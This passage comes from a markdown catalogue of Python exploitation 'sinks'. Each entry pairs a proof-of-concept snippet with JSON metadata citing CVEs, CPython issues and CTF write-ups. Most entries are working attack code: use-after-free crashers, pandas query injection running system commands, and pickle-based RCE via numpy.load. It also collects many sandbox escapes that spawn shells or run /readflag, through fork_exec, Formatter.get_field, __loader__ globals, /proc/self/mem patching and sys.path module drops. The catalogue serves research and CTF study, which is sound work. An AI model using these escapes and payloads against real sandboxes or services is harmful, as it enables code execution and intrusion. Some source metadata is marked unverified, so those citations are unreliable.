# Injects new section when written and re-read
```
**Ref**: CPython Issue #69909.

### `statistics` Module — Integer Overflow / NaN Handling
**Risk**: `stdev()` crashes on infinity input with `AttributeError`. `fmean()` overflows where `mean()` does not.

```python
from statistics import stdev
import math
stdev([math.inf])  # AttributeError: 'float' object has no attribute 'numerator'
```
**Ref**: CPython Issue #140938.

```json
{
  "sink_id": "NUMERIC-001",
  "category": "NUMERIC",
  "title": "statistics.stdev() Infinity Handling Crash",
  "severity": "medium",
  "affected_versions": ["3.13+", "3.14+", "3.15+"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/140938",
      "title": "`statistics.stdev()` raises `AttributeError` when data contains infinity",
      "author": "T90REAL",
      "date": "2025-11-03",
      "verified": false,
      "tags": ["statistics", "nan", "overflow", "crash", "stdlib"]
    }
  ],
  "confidence": "confirmed"
}
```

### `memoryview` Use-After-Free for Arbitrary Memory Read/Write
**Risk**: `memoryview` can persist after backing buffer is freed. Combined with heap layout manipulation, enables write-what-where.

```python
import io
class File(io.RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
        return 1
    def readable(self):
        return True

f = io.BufferedReader(File())
f.read(1)
del f
view = view.cast('P')
L = [None] * len(view)
view[0] = 0
print(L[0])  # NULL dereference
```
**Ref**: pwn.win — Exploiting a Use-After-Free for code execution in every version of Python 3.

```json
{
  "sink_id": "CPYTHON-001",
  "category": "CPYTHON",
  "title": "memoryview Dangling Buffer Use-After-Free",
  "severity": "critical",
  "affected_versions": ["2.7+", "3.6+", "3.7+", "3.8+", "3.9+", "3.10+", "3.11+", "3.12+", "3.13+"],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://pwn.win/2022/05/11/python-buffered-reader.html",
      "title": "Exploiting a Use-After-Free for code execution in every version of Python 3",
      "author": "pwn.win",
      "date": "2022-05-11",
      "verified": true,
      "tags": ["memoryview", "uaf", "arbitrary-read", "arbitrary-write", "sandbox-escape"]
    }
  ],
  "confidence": "confirmed"
}
```

### `array.__setitem__` UAF via Re-entrant `__index__`
**Risk**: Bounds check happens before `__index__()` callback, but write happens after. Malicious `__index__` clears array between check and write.

```python
import array
victim = array.array('b', [0] * 64)
class Evil:
    def __index__(self):
        victim.clear()
        return 1
victim[1] = Evil()  # SEGV
```
**Ref**: CPython Issue #142555.

```json
{
  "sink_id": "CPYTHON-002",
  "category": "CPYTHON",
  "title": "array.__setitem__ Re-entrant __index__ Use-After-Free",
  "severity": "high",
  "affected_versions": ["3.13+", "3.14+", "3.15+"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/142555",
      "title": "`array`: `*_setitem` functions & co may crash on re-entrant `__index__`",
      "author": "jackfromeast",
      "date": "2025-12-11",
      "verified": true,
      "tags": ["array", "uaf", "__index__", "reentrancy", "crash"]
    }
  ],
  "confidence": "confirmed"
}
```

### NumPy `numpy.load()` Arbitrary Code Execution (CVE-2019-6446)
**Risk**: Uses Python's `pickle` module internally when `allow_pickle=True`.

```python
import numpy as np
np.load('malicious.npy', allow_pickle=True)  # RCE via pickle payload
```
**Ref**: NVD CVE-2019-6446.

```json
{
  "sink_id": "DESER-001",
  "category": "DESER",
  "title": "numpy.load() Pickle-Based Arbitrary Code Execution",
  "severity": "high",
  "affected_versions": ["NumPy < 1.16.3", "Python 2.7", "Python 3.x"],
  "sources": [
    {
      "type": "cve",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-6446",
      "title": "CVE-2019-6446",
      "author": "NVD",
      "date": "2019-01-16",
      "cve_id": "CVE-2019-6446",
      "verified": true,
      "tags": ["numpy", "pickle", "deserialization", "rce", "allow_pickle"]
    }
  ],
  "confidence": "confirmed"
}
```

### `pandas.eval()` / `DataFrame.query()` Code Injection (CVE-2024-9880)
**Risk**: `@` prefix allows referencing arbitrary variables. Combined with pandas deep module imports, leads to code execution.

```python
import pandas
from os import system
df = pandas.DataFrame({'col1': [1, 2]})
df.query('@system("whoami")')  # Direct RCE
df.query('@pandas.compat.os.system("whoami")')  # No extra imports needed
```
**Ref**: Duarte Santos, July 2024.

```json
{
  "sink_id": "RCE-001",
  "category": "RCE",
  "title": "pandas DataFrame.query() Expression Injection to Code Execution",
  "severity": "high",
  "affected_versions": ["pandas <= 2.2.2", "Python 3.x"],
  "sources": [
    {
      "type": "security_advisory",
      "url": "https://github.com/pandas-dev/pandas/issues/60602",
      "title": "Question: does the project consider DataFrame.query() arbitrary code execution to be a vulnerability?",
      "author": "pandas-dev",
      "date": "2024-12-24",
      "verified": true,
      "tags": ["pandas", "query", "eval", "expression-injection", "rce"]
    }
  ],
  "confidence": "likely"
}
```

### Protobuf `json_format.ParseDict()` DoS via Recursion Bypass
**Risk**: `max_recursion_depth` bypassed through mutual recursion in well-known types (`Struct`/`Value`/`ListValue`).

```python
from google.protobuf import json_format, struct_pb2
nested = {"leaf": "data"}
for _ in range(500):
    nested = {"level": nested}
msg = struct_pb2.Struct()
json_format.ParseDict(nested, msg, max_recursion_depth=10)  # RecursionError
```
**Ref**: Protobuf Issue #26432.

```json
{
  "sink_id": "PROTOCOL-001",
  "category": "PROTOCOL",
  "title": "protobuf json_format.ParseDict() Recursion Limit Bypass",
  "severity": "medium",
  "affected_versions": ["protobuf-python 6.x", "Python 3.x"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/protocolbuffers/protobuf/issues/26432",
      "title": "json_format.ParseDict() DoS via recursion-depth bypass in Struct/Value/ListValue",
      "author": "protocolbuffers/protobuf",
      "date": "2025-01-01",
      "verified": false,
      "tags": ["protobuf", "json", "recursion", "dos", "parser"]
    }
  ],
  "confidence": "likely"
}
```

### `__index__` Re-entrant UAF in `memoryview` Slicing
**Risk**: `memory_subscript()` creates new view before parsing slice indices. `__index__` releasing buffer leaves dangling pointer.

```python
import mmap, os, tempfile
fd, path = tempfile.mkstemp()
os.write(fd, b"A" * 4096)
mm = mmap.mmap(fd, 4096, access=mmap.ACCESS_WRITE)
mv = memoryview(mm)

class Trigger:
    def __index__(self):
        mv.release()
        os.ftruncate(fd, 0)
        return 0

sub = mv[slice(Trigger(), None, None)]
sub[0]  # UAF crash
```
**Ref**: CPython Issue #142665.

```json
{
  "sink_id": "CPYTHON-003",
  "category": "CPYTHON",
  "title": "memoryview Slice Index Re-entrancy Use-After-Free",
  "severity": "high",
  "affected_versions": ["3.9+", "3.10+", "3.11+", "3.12+", "3.13+", "3.14+", "3.15+"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/142665",
      "title": "Use-after-free in `memoryview` slicing via re-entrant `__index__`",
      "author": "jackfromeast",
      "date": "2025-12-13",
      "verified": true,
      "tags": ["memoryview", "uaf", "slicing", "__index__", "reentrancy"]
    }
  ],
  "confidence": "confirmed"
}
```

### `bytearray.find()` / `.index()` UAF via Re-entrant `__index__`
**Risk**: `bytearray.index(x)` converts `x` to single byte using `__index__` before search. Crafted `__index__` calls `bytearray.clear()`, freeing buffer after `str` captured.

```python
victim = bytearray(b'A')
class Evil:
    def __index__(self):
        victim.clear()
        return 65
victim.index(Evil())  # heap UAF
```
**Ref**: CPython Issue #142560.

```json
{
  "sink_id": "CPYTHON-004",
  "category": "CPYTHON",
  "title": "bytearray.index() Re-entrant __index__ Use-After-Free",
  "severity": "high",
  "affected_versions": ["3.13+", "3.14+", "3.15+"],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/142560",
      "title": "`bytearray.find/index` may crash on re-entrant `__index__`",
      "author": "jackfromeast",
      "date": "2025-12-11",
      "verified": true,
      "tags": ["bytearray", "uaf", "__index__", "reentrancy", "crash"]
    }
  ],
  "confidence": "confirmed"
}
```

### `_posixsubprocess.fork_exec` Direct Syscall
**Risk**: When `sys.modules` is cleared, `_posixsubprocess` module still has direct syscall access.

```python
import_ = ().__class__.__base__.__subclasses__()[84].load_module
_posixsubprocess = import_("_posixsubprocess")
pipe = ().__class__.__base__.__subclasses__()[133].__init__.__globals__['pipe']
_posixsubprocess.fork_exec([b"/readflag"], [b"/readflag"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(pipe()), False, False, None, None, None, -1, None)
```
**Ref**: HXP CTF 2021 "audited2".

```json
{
  "sink_id": "STDLIB-001",
  "category": "STDLIB",
  "title": "_posixsubprocess.fork_exec Sandbox Escape Primitive",
  "severity": "high",
  "affected_versions": ["3.x on POSIX"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/task/15647",
      "title": "hxp CTF 2021 - audited2",
      "author": "CTFtime",
      "date": "2021-12-27",
      "verified": false,
      "tags": ["pyjail", "_posixsubprocess", "fork_exec", "sandbox-escape", "ctf"]
    }
  ],
  "confidence": "likely"
}
```

### `string.Formatter.get_field` Arbitrary Getattr
**Risk**: `string.Formatter.get_field` uses unrestricted `getattr` internally, bypassing `safer_getattr` in RestrictedPython.

```python
import string
string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], {"a": ""})[0]()[84].load_module("os").system("sh")
```
**Ref**: UIUCTF 2023 "Rattler Read".

```json
{
  "sink_id": "STDLIB-002",
  "category": "STDLIB",
  "title": "string.Formatter.get_field() Unrestricted Attribute Traversal",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/task/25562",
      "title": "UIUCTF 2023 - Rattler Read",
      "author": "CTFtime",
      "date": "2023-07-03",
      "verified": false,
      "tags": ["string.Formatter", "get_field", "attribute-traversal", "restrictedpython", "ctf"]
    }
  ],
  "confidence": "likely"
}
```

### `antigravity` Browser Hijacking
**Risk**: `antigravity` module imports `webbrowser` which checks `os.environ["BROWSER"]` for command execution.

```python
__import__('antigravity',
    setattr(__import__('os'),'environ',
        dict(BROWSER='/bin/sh -c "/readflag giveflag" #%s'))
)
```
**Ref**: idek 2022 Pyjail Revenge.

```json
{
  "sink_id": "STDLIB-003",
  "category": "STDLIB",
  "title": "antigravity Import Triggers webbrowser Command Execution",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/",
      "title": "idek 2022 CTF: Pyjail & Pyjail Revenge Writeup",
      "author": "crazymanarmy",
      "date": "2023-01-18",
      "verified": true,
      "tags": ["antigravity", "webbrowser", "BROWSER", "sandbox-escape", "pyjail"]
    }
  ],
  "confidence": "confirmed"
}
```

### Format String Attribute Traversal (No Eval)
**Risk**: Flask's `str.format()` allows attribute traversal on passed objects.

```python
# In Python jail
{a.__init__.__globals__[flag]}
# Response leaks flag variable
```
**Ref**: ImaginaryCTF 2021 "Formatting".

```json
{
  "sink_id": "SSTI-001",
  "category": "SSTI",
  "title": "str.format() Attribute Traversal Information Disclosure",
  "severity": "medium",
  "affected_versions": ["2.7", "3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/task/16059",
      "title": "ImaginaryCTF 2021 - Formatting",
      "author": "CTFtime",
      "date": "2021-07-25",
      "verified": false,
      "tags": ["format", "attribute-traversal", "infoleak", "flask", "ctf"]
    }
  ],
  "confidence": "likely"
}
```

### RestrictedPython Format Bypass
**Risk**: `str.format()` and `str.format_map()` allow recursive attribute lookup even in RestrictedPython.

```python
"{0.__class__.__init__.__globals__}".format(some_object)
string.Formatter().get_field("a.secret", [], {"a": obj})
```
**Ref**: zopefoundation/RestrictedPython GHSA-xjw2-6jm9-rf67.

```json
{
  "sink_id": "SSTI-002",
  "category": "SSTI",
  "title": "RestrictedPython format()/format_map() Attribute Traversal Bypass",
  "severity": "high",
  "affected_versions": ["RestrictedPython < 6.2", "Python 3.x"],
  "sources": [
    {
      "type": "github_advisory",
      "url": "https://github.com/advisories/GHSA-xjw2-6jm9-rf67",
      "title": "RestrictedPython allows breakout with string formatting",
      "author": "GitHub Advisory Database",
      "date": "2023-08-28",
      "ghsa": "GHSA-xjw2-6jm9-rf67",
      "verified": true,
      "tags": ["restrictedpython", "format", "sandbox-escape", "attribute-traversal", "ghsa"]
    }
  ],
  "confidence": "confirmed"
}
```

### ZIP/Polyglot File Execution
**Risk**: Python executes ZIP archives directly. EOCD record at end of ZIP file is backwards-relative. Content between Python script end and EOCD parsed as ZIP metadata. EOCD comment field allows arbitrary trailing Python code.

```python
# Polyglot construction: file starts with Python script, ends with ZIP EOCD
# python archive.zip executes __main__.py inside ZIP
```
**Ref**: UIUCTF 2025 "comments-only" (11 solves).

```json
{
  "sink_id": "PROTOCOL-002",
  "category": "PROTOCOL",
  "title": "Python ZIP Polyglot Execution via EOCD Comment Abuse",
  "severity": "medium",
  "affected_versions": ["2.7", "3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/task/29609",
      "title": "UIUCTF 2025 - comments-only",
      "author": "CTFtime",
      "date": "2025-07-01",
      "verified": false,
      "tags": ["zip", "polyglot", "eocd", "archive", "ctf"]
    }
  ],
  "confidence": "likely"
}
```

### `__loader__` Access for Real Builtins
**Risk**: Import machinery bootstrap variables (`_os`, `_sys`) survive even when `__builtins__` is globally overwritten.

```python
__loader__.SourceFileLoader.get_data.__globals__["_os"].system("sh")
```
**Ref**: ALLES! CTF 2020.

```json
{
  "sink_id": "STDLIB-004",
  "category": "STDLIB",
  "title": "__loader__ Globals Expose Real _os and _sys Handles",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/event/1056",
      "title": "ALLES! CTF 2020",
      "author": "CTFtime",
      "date": "2020-09-05",
      "verified": false,
      "tags": ["__loader__", "importlib", "_os", "sandbox-escape", "ctf"]
    }
  ],
  "confidence": "likely"
}
```

### `/proc/self/mem` Function Pointer Patching (PlaidCTF 2014)
**Risk**: Python `file` objects expose `/proc/self/mem` — direct window into process memory. Function pointers in Python object descriptor tables can be overwritten.

```python
[(fd.seek(0x0088af88),
  fd.write("\x40\x5f\x52"),
  fd.flush(),
  fd.readlines("/bin/sh", ["/bin/sh"]))
 for fd in (().__class__.__bases__[0].__subclasses__()[40]("/proc/self/mem", "w"),)]
```
**Ref**: fail0verflow — PlaidCTF 2014 `__nightmares__`.

```json
{
  "sink_id": "CTF-001",
  "category": "CTF",
  "title": "/proc/self/mem Object Table Patching for Code Execution",
  "severity": "critical",
  "affected_versions": ["2.7", "3.x on Linux"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://fail0verflow.com/blog/2014/plaidctf-2014-nightmares/",
      "title": "PlaidCTF 2014: __nightmares__",
      "author": "fail0verflow",
      "date": "2014-04-14",
      "verified": true,
      "tags": ["procfs", "memory-write", "function-pointer", "sandbox-escape", "pyjail"]
    }
  ],
  "confidence": "confirmed"
}
```

### `sys.path` Modification + File Write
**Risk**: Overwrite `sys.path` to writable location, write payload file, import and execute.

```python
setattr(__import__("sys"), "path", list(("/dev/shm/",)))
print("import os" + chr(10) + "os.system('/readflag')", file=open("/dev/shm/exp.py", "w"))
__import__("exp")
```
**Ref**: idek 2022 Pyjail Revenge Method 2.

```json
{
  "sink_id": "FILE-001",
  "category": "FILE",
  "title": "sys.path Redirection Plus Writable Module Drop",
  "severity": "high",
  "affected_versions": ["3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/",
      "title": "idek 2022 CTF: Pyjail & Pyjail Revenge Writeup",
      "author": "crazymanarmy",
      "date": "2023-01-18",
      "verified": true,
      "tags": ["sys.path", "file-write", "import", "module-drop", "pyjail"]
    }
  ],
  "confidence": "confirmed"
}
```

### `func_code.co_consts` — Reading Constants from Restricted Functions
**Risk**: `func_code` exposes all constants used inside a function, including hidden flag strings.

```python
>>> exit.func_code.co_consts
(None, 'flag-THE_FLAG', -1, 'cat .passwd', 'You cannot escape !')
>>> exit(exit.func_code.co_consts[1])
Well done flag : flag-THE_REAL_FLAG
```
**Ref**: lbarman.ch — Escaping the PyJail.

```json
{
  "sink_id": "CTF-002",
  "category": "CTF",
  "title": "func_code.co_consts Secret Extraction Primitive",
  "severity": "medium",
  "affected_versions": ["2.7"],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://lbarman.ch/blog/pyjail/",
      "title": "Escaping the PyJail",
      "author": "lbarman",
      "date": "2016-09-04",
      "verified": false,
      "tags": ["func_code", "co_consts", "infoleak", "pyjail", "python2"]
    }
  ],
  "confidence": "likely"
}
```

### `dir()` Attribute Lookup Escape
**Risk**: Substring blacklists never see blocked words generated at runtime via `dir()`.

```python
attrs = dir([])
i_class = attrs.index('__class__')
cls = getattr([], attrs[i_class])
```
**Ref**: InCTF 2018.

```json
{
  "sink_id": "CTF-003",
  "category": "CTF",
  "title": "dir() Generated Attribute Names Bypass Blacklists",
  "severity": "medium",
  "affected_versions": ["2.7", "3.x"],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/event/669",
      "title": "InCTF 2018",
      "author": "CTFtime",
      "date": "2018-10-05",
      "verified": false,
      "tags": ["dir", "getattr", "blacklist-bypass", "pyjail", "ctf"]
    }
  ],
  "confidence": "likely"
}
```

---

*Last updated: 2026-04-29. Covers well-known sinks and 80+ niche sinks with real CTF references, CVEs, and exploitation caveats. Synthesized from 20 parallel research subagents navigating entire blog posts, CTF writeups, and security research papers.*
